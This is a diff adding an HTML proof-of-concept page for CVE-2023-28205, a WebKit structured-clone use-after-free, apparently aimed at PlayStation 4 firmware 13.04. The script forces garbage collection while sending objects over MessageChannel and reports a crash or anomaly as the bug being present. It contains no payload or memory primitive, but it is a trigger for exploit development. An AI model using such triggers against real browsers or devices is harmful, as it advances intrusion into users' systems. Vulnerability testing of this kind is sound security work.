@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<!--
+  PoC: CVE-2023-28205 — SerializedScriptValue CloneDeserializer UAF
+
+  DESCRIÇÃO:
+  O deserializador de structured clone usa Vector<JSObject*,32> para
+  rastrear objetos criados durante a deserialização. Esses containers
+  NÃO são escaneados pelo Garbage Collector. Se um ciclo GC for
+  disparado durante a deserialização, objetos referenciados somente
+  por esses containers podem ser reclamados, resultando em ponteiros
+  stale sendo acessados.
+
+  MECANISMO:
+  postMessage → structured clone serialize → transfer + deserialize
+  Durante deserialize: GC cycle → objeto freed → UAF no ponteiro stale
+  Acesso ao objeto freed → corrupção de StructureID / butterfly pointer
+
+  PRIMITIVA: addrof/fakeobj potencial via WebKit build ~613.1.17.1
+
+  STATUS: Explorado in-the-wild antes do patch (Abril 2023)
+  STATUS PS4 FW 13.04: NÃO TESTADO em 13.x
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2023-28205 — Structured Clone UAF</title>
+<style>
+  body{background:#0a0a0a;color:#ccc;font-family:monospace;padding:16px;margin:0;font-size:13px}
+  #log{background:#111;border:1px solid #333;padding:10px;height:76vh;overflow-y:auto;font-size:11px;line-height:1.8}
+  .ok{color:#00ff88}.fail{color:#ff4444}.info{color:#ffcc44}.warn{color:#ff8844}
+  .vuln{color:#ff44ff;font-weight:bold}.patched{color:#44aaff}.dim{color:#555}
+  .bar{background:#0a1a0a;border:1px solid #1a3a1a;color:#44aa44;padding:6px 10px;margin-bottom:8px;font-size:11px}
+</style>
+</head>
+<body>
+<div style="color:#aaa;font-size:12px;margin-bottom:6px">CVE-2023-28205 · Structured Clone UAF · postMessage · FW 13.04</div>
+<div class="bar" id="bar">Iniciando...</div>
+<div id="log"></div>
+<script>
+"use strict";
+var logEl=document.getElementById('log'),barEl=document.getElementById('bar');
+function L(m,c){logEl.innerHTML+='<div class="'+(c||'dim')+'">'+m+'</div>';logEl.scrollTop=logEl.scrollHeight;}
+function bar(m){barEl.textContent=m;}
+
+// Forçar GC via alocação e descarte massivo
+function forceGC(){
+  var trash=[];
+  for(var i=0;i<0x4000;i++){
+    trash.push({a:new Float64Array(8),b:{x:i,y:i*1.1}});
+  }
+  trash=null;
+}
+
+// Criar objeto complexo para structured clone
+function makeComplexObj(depth){
+  if(depth<=0) return {leaf:true, val:1.1, arr:[1,2,3]};
+  return {
+    child: makeComplexObj(depth-1),
+    sibling: makeComplexObj(depth-1),
+    val: depth*1.1,
+    buf: new ArrayBuffer(64)
+  };
+}
+
+function run(){
+  L('CVE-2023-28205 — SerializedScriptValue CloneDeserializer UAF','info');
+  L('WebKit build ~613.1.17.1 (linhagem PlayStation). Testando FW 13.04...','info');
+  L('','');
+
+  // ── Verificar suporte ──────────────────────────────────────
+  L('[1/5] Verificando suporte a postMessage/structured clone...','warn');
+  bar('[1/5] Verificando...');
+  setTimeout(function(){
+    if(typeof MessageChannel==='undefined'){
+      L('[1/5] MessageChannel não suportado','fail');
+      bar('NÃO SUPORTADO'); return;
+    }
+    L('[1/5] MessageChannel suportado ✓','ok');
+
+    // ── Teste baseline ─────────────────────────────────────
+    L('','');
+    L('[2/5] Baseline: structured clone simples...','warn');
+    bar('[2/5] Baseline...');
+    setTimeout(function(){
+      try {
+        var ch=new MessageChannel();
+        var received=false;
+        ch.port2.onmessage=function(e){
+          received=true;
+          L('[2/5] Clone recebido OK — keys: '+Object.keys(e.data).join(','),'ok');
+        };
+        ch.port2.start();
+        ch.port1.postMessage({x:1.1,y:2.2,z:[1,2,3]});
+        setTimeout(function(){
+          if(!received) L('[2/5] Mensagem não recebida','warn');
+        },500);
+      }catch(e){L('[2/5] Erro baseline: '+e,'fail');}
+
+      // ── Pressão de memória durante clone ──────────────────
+      L('','');
+      L('[3/5] Teste com pressão GC durante deserialização...','warn');
+      bar('[3/5] Pressão GC...');
+      setTimeout(function(){
+        try {
+          var ch2=new MessageChannel();
+          var anomaly=false;
+          ch2.port2.onmessage=function(e){
+            // Verificar se objeto deserializado é válido
+            try {
+              var d=e.data;
+              if(d && typeof d==='object'){
+                // Forçar GC imediatamente ao receber
+                forceGC();
+                // Tentar acessar propriedades após GC
+                var v=d.val;
+                var c=d.child;
+                if(typeof v!=='number' && v!==undefined){
+                  L('[3/5] TIPO ANÔMALO em d.val: '+typeof v,'vuln');
+                  anomaly=true;
+                }
+              }
+            }catch(e2){
+              L('[3/5] Exceção ao acessar objeto deserializado: '+e2,'vuln');
+              anomaly=true;
+            }
+          };
+          ch2.port2.start();
+
+          // Enviar objeto complexo com pressão GC no sender
+          forceGC();
+          var complex=makeComplexObj(3);
+          ch2.port1.postMessage(complex);
+          forceGC(); // GC logo após postMessage
+
+          setTimeout(function(){
+            if(!anomaly) L('[3/5] Sem anomalias no clone simples ✓','ok');
+          },500);
+        }catch(e){L('[3/5] Erro: '+e,'warn');}
+
+        // ── Teste com ArrayBuffer transferable ───────────────
+        L('','');
+        L('[4/5] Teste com ArrayBuffer transferable + GC...','warn');
+        bar('[4/5] Transferable + GC...');
+        setTimeout(function(){
+          try {
+            var ch3=new MessageChannel();
+            ch3.port2.onmessage=function(e){
+              forceGC(); // GC durante handling
+              var d=e.data;
+              if(d.buf){
+                L('[4/5] Buffer recebido: byteLength='+d.buf.byteLength,'info');
+                if(d.buf.byteLength!==1024){
+                  L('[4/5] byteLength inesperado: '+d.buf.byteLength+' — ANOMALIA!','vuln');
+                }
+              }
+            };
+            ch3.port2.start();
+            var buf=new ArrayBuffer(1024);
+            ch3.port1.postMessage({buf:buf,meta:{x:1.1}},[buf]);
+          }catch(e){L('[4/5] Erro: '+e,'warn');}
+
+          // ── Teste massivo de deserialização ──────────────
+          L('','');
+          L('[5/5] Trigger massivo (500 clones com pressão GC)...','warn');
+          L('[5/5] SE O BROWSER FECHAR = CVE-2023-28205 PRESENTE','vuln');
+          bar('[5/5] Trigger massivo...');
+          setTimeout(function(){
+            try {
+              var errors=0;
+              var ch4=new MessageChannel();
+              var count=0;
+              ch4.port2.onmessage=function(e){
+                count++;
+                forceGC();
+                try{
+                  var d=e.data;
+                  void d.val; void d.child; void d.sibling;
+                }catch(ex){errors++;}
+              };
+              ch4.port2.start();
+              for(var i=0;i<500;i++){
+                forceGC();
+                ch4.port1.postMessage(makeComplexObj(4));
+              }
+              setTimeout(function(){
+                L('[5/5] Recebidas: '+count+'/500 | Erros: '+errors,'info');
+                if(errors>0){
+                  L('[5/5] '+errors+' erros de acesso — UAF possível!','vuln');
+                } else {
+                  L('[5/5] Sem erros de acesso ✓','ok');
+                }
+                L('','');
+                L('══════════════════════════════════','warn');
+                L('CRASH = CVE-2023-28205 PRESENTE','vuln');
+                L('Erros de acesso = UAF detectado','vuln');
+                L('Sem erros = PATCHED','patched');
+                L('══════════════════════════════════','warn');
+                bar('DONE');
+              },3000);
+            }catch(e){L('[5/5] Erro: '+e,'warn'); bar('DONE');}
+          },500);
+        },500);
+      },500);
+    },300);
+  },200);
+}
+window.addEventListener('load',function(){setTimeout(run,300);});
+</script>
+</body>
+</html>
